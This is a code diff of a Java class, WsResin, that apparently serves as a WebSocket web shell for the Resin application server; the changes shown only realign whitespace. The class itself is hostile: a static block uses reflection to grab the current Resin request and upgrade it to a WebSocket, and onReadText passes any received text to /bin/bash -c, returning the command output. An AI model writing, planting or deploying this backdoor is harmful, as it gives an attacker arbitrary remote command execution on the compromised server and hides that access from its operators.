@@ -13,17 +13,17 @@ public class WsResin implements WebSocketListener {
 
     static {
         try {
-            ClassLoader classloader          = Thread.currentThread().getContextClassLoader();
-            Class       servletInvocationcls = classloader.loadClass("com.caucho.server.dispatch.ServletInvocation");
-            Object      contextRequest       = servletInvocationcls.getMethod("getContextRequest").invoke(null);
-            String      protocol             = (String) contextRequest.getClass().getMethod("getHeader").invoke(contextRequest, "Upgrade");
+            ClassLoader classloader = Thread.currentThread().getContextClassLoader();
+            Class servletInvocationcls = classloader.loadClass("com.caucho.server.dispatch.ServletInvocation");
+            Object contextRequest = servletInvocationcls.getMethod("getContextRequest").invoke(null);
+            String protocol = (String) contextRequest.getClass().getMethod("getHeader").invoke(contextRequest, "Upgrade");
             //String protocol       = request.getHeader("Upgrade");
             if (!"websocket".equals(protocol)) {
                 System.out.println("not websocket");
                 System.exit(0);
             }
-            WebSocketListener       listener = new WsResin();
-            WebSocketServletRequest wsReq    = (WebSocketServletRequest) contextRequest;
+            WebSocketListener listener = new WsResin();
+            WebSocketServletRequest wsReq = (WebSocketServletRequest) contextRequest;
             wsReq.startWebSocket(listener);
         } catch (Exception ignored) {
         }
@@ -32,7 +32,7 @@ public class WsResin implements WebSocketListener {
     @Override
     public void onReadText(WebSocketContext context, Reader is) throws IOException {
         StringBuilder sb = new StringBuilder();
-        int           ch;
+        int ch;
         while ((ch = is.read()) >= 0) {
             sb.append((char) ch);
         }
@@ -44,9 +44,9 @@ public class WsResin implements WebSocketListener {
             } else {
                 process = Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", sb.toString()});
             }
-            InputStream   inputStream   = process.getInputStream();
+            InputStream inputStream = process.getInputStream();
             StringBuilder stringBuilder = new StringBuilder();
-            int           i;
+            int i;
             while ((i = inputStream.read()) != -1)
                 stringBuilder.append((char) i);
             inputStream.close();
